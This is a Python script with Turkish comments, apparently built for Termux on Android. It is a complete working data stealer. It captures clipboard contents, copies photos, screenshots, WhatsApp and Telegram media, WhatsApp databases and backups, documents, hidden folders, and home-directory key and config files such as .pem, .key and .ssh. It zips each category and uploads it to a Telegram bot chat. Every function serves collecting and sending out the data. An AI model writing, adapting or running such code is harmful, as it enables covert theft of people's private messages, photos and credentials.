# main.py

import os
import shutil
import subprocess
import requests
from datetime import datetime
import config # config.py dosyasını içe aktar

# --- Konfigürasyonlar config.py'den alınır ---
BOT_TOKEN = config.BOT_TOKEN
CHAT_ID = config.CHAT_ID
STORAGE_ROOT = config.STORAGE_ROOT

# Geçici çalışma dizini (Termux ana dizininde oluşturulacak)
WORKING_DIR = os.path.join(os.path.expanduser("~"), "collected_data_dump")

# Kategori bazlı dosya yolları (Termux'un root olmadan erişebileceği yollar)
# Kullanıcının verdiği yolların en yaygın ve erişilebilir olanları hedeflenmiştir.
# Not: Android/data ve Android/obb gibi yollar Android 11+ cihazlarda Termux'tan erişilemez.
# Betik, erişim izni olmayan yolları otomatik olarak atlayacaktır.
TARGET_CATEGORIES = {
    "DCIM_Camera": ["DCIM/Camera", "DCIM/Screenshots", "Pictures/Screenshots", "DCIM/.thumbnails"],
    "Pictures_Others": ["Pictures", "Resimler", "Pictures/Instagram", "Pictures/Telegram", "Pictures/WhatsApp"],
    "Downloads": ["Download", "İndirilenler", "Download/apk-files"],
    "Documents": ["Documents", "Belgeler", "Books", "Scans"],
    "Media_General": ["Movies", "Filmler", "Music", "Müzikler", "Notifications", "Bildirimler", "Ringtones", "Zil Sesleri", "Podcasts", "Recordings"],
    "WhatsApp_Media": [
        "WhatsApp/Media/WhatsApp Images", "WhatsApp/Media/WhatsApp Video", "WhatsApp/Media/WhatsApp Audio", 
        "WhatsApp/Media/WhatsApp Documents", "WhatsApp/Media/WhatsApp Voice Notes", "WhatsApp/Media/WhatsApp Stickers", 
        "WhatsApp/Media/WhatsApp Animated Gifs", "Android/media/com.whatsapp/WhatsApp/Media"
    ],
    "WhatsApp_Data": ["WhatsApp/Databases", "WhatsApp/Backups"],
    "Telegram_Media": [
        "Telegram/Telegram Images", "Telegram/Telegram Video", "Telegram/Telegram Audio", 
        "Telegram/Telegram Documents", "Telegram/Telegram Voice", "Telegram/Telegram Animated",
        "Android/media/org.telegram.messenger/Telegram"
    ],
    "App_Data_Media": [
        "Android/media/com.spotify.music", "Android/media/com.facebook.katana", 
        "Android/media/com.instagram.android", "Android/media/com.telegram.messenger"
    ],
    "Backups_Configs": ["Backups", ".Trash", ".recycle", ".config", ".cache", ".thumbnails", ".hidden", ".nomedia"],
    # Termux'un kendi home dizinindeki hassas dosyalar (Config_Keys)
    "Termux_Home_Configs": ["~"] 
}

# Kullanıcının özellikle istediği, ancak root izni olmadan erişilemeyen sistem yolları
# Bu yollar için ayrı bir kategori oluşturulacak ve erişim denenecektir.
# Termux'un root olmadan erişebildiği yollar: /sdcard, /storage/emulated/0, /storage/self/primary
# Termux'un root olmadan erişemediği yollar: /data, /system, /vendor, /proc, /etc, /mnt/media_rw
SYSTEM_PATHS_TO_TRY = {
    "System_Paths_Limited": [
        "/sdcard", "/storage/self/primary", "/storage/emulated/0",
        "/storage/<SDCARD_ID>", "/storage/<USB_ID>", # SD kart ve USB yolları (Termux'un erişebildiği kadarıyla)
        "/mnt/sdcard", "/mnt/sdcard2", "/mnt/obb", "/mnt/usbdrive", # Eski/alternatif depolama yolları
        "/data/local/tmp", "/data/anr", "/data/tombstones", "/data/misc", "/data/log", # Termux'un kendi alanına yakın yollar
        "/data/data/com.termux/files/home", "/data/data/com.termux/files/usr", # Termux'un kendi yolları
        "/lost+found", "/tmp", "/mnt" # Diğer genel yollar
    ]
}

def send_message(text):
    """Telegram'a metin mesajı gönderir."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except requests.exceptions.RequestException as e:
        print(f"Telegram mesajı gönderilemedi: {e}")

def send_file_to_telegram(file_path, caption):
    """Telegram'a dosya (ZIP) gönderir."""
    send_message(f"Dosya gönderme işlemi başladı: {os.path.basename(file_path)}")
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            payload = {
                "chat_id": CHAT_ID,
                "caption": caption
            }
            response = requests.post(url, data=payload, files=files, timeout=3600) 
            response.raise_for_status()
            
            if response.json().get("ok"):
                send_message(f"✅ Dosya başarıyla gönderildi: {os.path.basename(file_path)}")
                print(f"Dosya başarıyla gönderildi: {file_path}")
            else:
                error_msg = response.json().get('description', 'Bilinmeyen Hata')
                send_message(f"❌ Dosya gönderilemedi: {error_msg}")
                print(f"Dosya gönderilemedi: {error_msg}")
                
    except requests.exceptions.RequestException as e:
        send_message(f"❌ Dosya gönderimi sırasında ağ hatası: {e}")
        print(f"Dosya gönderimi sırasında ağ hatası: {e}")

def setup_working_dir():
    """Çalışma dizinini oluşturur ve temizler."""
    if os.path.exists(WORKING_DIR):
        shutil.rmtree(WORKING_DIR)
    os.makedirs(WORKING_DIR)
    print(f"Çalışma dizini oluşturuldu: {WORKING_DIR}")

def collect_clipboard():
    """Panodaki içeriği toplar ve dosyaya yazar."""
    clipboard_file = os.path.join(WORKING_DIR, "clipboard_content.txt")
    try:
        result = subprocess.run(["termux-clipboard-get"], capture_output=True, text=True, check=True)
        clipboard_content = result.stdout.strip()
        
        if not clipboard_content:
            clipboard_content = "Pano içeriği boş veya alınamadı."
            
        with open(clipboard_file, "w", encoding="utf-8") as f:
            f.write(clipboard_content)
        send_message(f"📋 Pano içeriği toplandı. İlk 50 karakter: {clipboard_content[:50]}...")
        
    except FileNotFoundError:
        send_message(f"⚠️ Pano toplama hatası: termux-api paketi kurulu değil.")
    except Exception as e:
        send_message(f"⚠️ Pano toplama hatası: {e}")

def copy_category(category_name, source_paths, is_system_path=False):
    """Belirtilen yollardaki dosyaları kategori bazında kopyalar."""
    
    category_dir = os.path.join(WORKING_DIR, category_name)
    os.makedirs(category_dir, exist_ok=True)
    copied_count = 0
    
    for path in source_paths:
        
        if path == "~":
            # Termux Home dizini için özel işlem
            full_path = os.path.expanduser("~")
            # Sadece hassas olabilecek dosyaları hedefle (örnek: .bashrc, .ssh, .gitconfig, .pem, .key)
            for root, _, files in os.walk(full_path):
                for file in files:
                    if file.startswith('.') or file.endswith(('.pem', '.key', '.db', '.sqlite', '.conf', '.cfg', '.json')):
                        source_file = os.path.join(root, file)
                        try:
                            shutil.copy2(source_file, category_dir)
                            copied_count += 1
                        except Exception as e:
                            print(f"Home config kopyalama hatası {source_file}: {e}")
            continue
            
        # Harici depolama yolları veya sistem yolları
        if is_system_path:
            full_path = path.replace("<SDCARD_ID>", "0").replace("<USB_ID>", "0") # Placeholder'ları deneme amaçlı 0 ile değiştir
        else:
            full_path = os.path.join(STORAGE_ROOT, path)
        
        if not os.path.exists(full_path):
            continue
            
        # shutil.copytree kullanmak yerine os.walk ile ilerleme takibi ve hata yönetimi
        for root, dirs, files in os.walk(full_path):
            # Hedef dizin yolunu oluştur
            if is_system_path:
                # Sistem yolları için kök dizin olarak path'i kullan
                relative_path = os.path.relpath(root, path)
            else:
                # Harici depolama yolları için kök dizin olarak full_path'i kullan
                relative_path = os.path.relpath(root, full_path)
                
            dest_dir = os.path.join(category_dir, relative_path)
            os.makedirs(dest_dir, exist_ok=True)
            
            for file in files:
                source_file = os.path.join(root, file)
                dest_file = os.path.join(dest_dir, file)
                
                try:
                    if os.path.islink(source_file):
                        continue
                    
                    shutil.copy2(source_file, dest_file)
                    copied_count += 1
                    
                except Exception as e:
                    print(f"Dosya kopyalama hatası {source_file}: {e}")
                    
    if copied_count > 0:
        send_message(f"✅ {category_name} kategorisinden {copied_count} dosya toplandı.")
    else:
        print(f"⚠️ {category_name} kategorisinden dosya bulunamadı.")
        
    return copied_count

def collect_and_send_by_category():
    """Kategori bazında toplama, sıkıştırma ve gönderme işlemini yapar."""
    
    send_message("🚀 Kategori bazlı veri toplama ve gönderme işlemi başladı.")
    
    total_files_copied = 0
    
    # 1. Pano içeriğini topla
    collect_clipboard()
    
    # 2. Kategori bazında kopyala, sıkıştır ve gönder (Harici Depolama)
    for category, paths in TARGET_CATEGORIES.items():
        copied_count = copy_category(category, paths)
        total_files_copied += copied_count
        
        category_dir = os.path.join(WORKING_DIR, category)
        
        # Eğer kategoriye ait dosya toplandıysa
        if os.path.exists(category_dir) and os.listdir(category_dir):
            
            # Sıkıştırma
            zip_path_base = os.path.join(os.path.expanduser("~"), f"{category}_Dump_{datetime.now().strftime('%Y%m%d')}")
            shutil.make_archive(zip_path_base, 'zip', os.path.dirname(category_dir), os.path.basename(category_dir))
            zip_path = f"{zip_path_base}.zip"
            
            # Gönderme
            caption = f"Termux Dump - Kategori: {category}\nToplam dosya: {copied_count}"
            send_file_to_telegram(zip_path, caption)
            
            # Temizlik (ZIP dosyası)
            os.remove(zip_path)
            
        # Temizlik (Geçici kategori klasörü)
        if os.path.exists(category_dir):
            shutil.rmtree(category_dir)
            
    # 3. Kategori bazında kopyala, sıkıştır ve gönder (Sistem Yolları)
    for category, paths in SYSTEM_PATHS_TO_TRY.items():
        copied_count = copy_category(category, paths, is_system_path=True)
        total_files_copied += copied_count
        
        category_dir = os.path.join(WORKING_DIR, category)
        
        # Eğer kategoriye ait dosya toplandıysa
        if os.path.exists(category_dir) and os.listdir(category_dir):
            
            # Sıkıştırma
            zip_path_base = os.path.join(os.path.expanduser("~"), f"{category}_Dump_{datetime.now().strftime('%Y%m%d')}")
            shutil.make_archive(zip_path_base, 'zip', os.path.dirname(category_dir), os.path.basename(category_dir))
            zip_path = f"{zip_path_base}.zip"
            
            # Gönderme
            caption = f"Termux Dump - Kategori: {category} (Sistem Yolları)\nToplam dosya: {copied_count}"
            send_file_to_telegram(zip_path, caption)
            
            # Temizlik (ZIP dosyası)
            os.remove(zip_path)
            
        # Temizlik (Geçici kategori klasörü)
        if os.path.exists(category_dir):
            shutil.rmtree(category_dir)
            
    send_message(f"✅ Tüm kategoriler işlendi. Toplam {total_files_copied} dosya kopyalandı ve gönderildi.")


def cleanup():
    """Tüm geçici dosyaları temizler."""
    if os.path.exists(WORKING_DIR):
        shutil.rmtree(WORKING_DIR)
        print(f"Geçici çalışma dizini temizlendi: {WORKING_DIR}")


if __name__ == "__main__":
    try:
        send_message("🚀 Termux Kategori Bazlı Dump Betiği Başlatıldı.")
        setup_working_dir()
        collect_and_send_by_category()
        send_message("🏁 Termux Kategori Bazlı Dump Betiği Tamamlandı.")
    except Exception as e:
        send_message(f"❌ Kritik Hata: Betik çalışması sırasında beklenmedik bir hata oluştu: {e}")
    finally:
        cleanup()
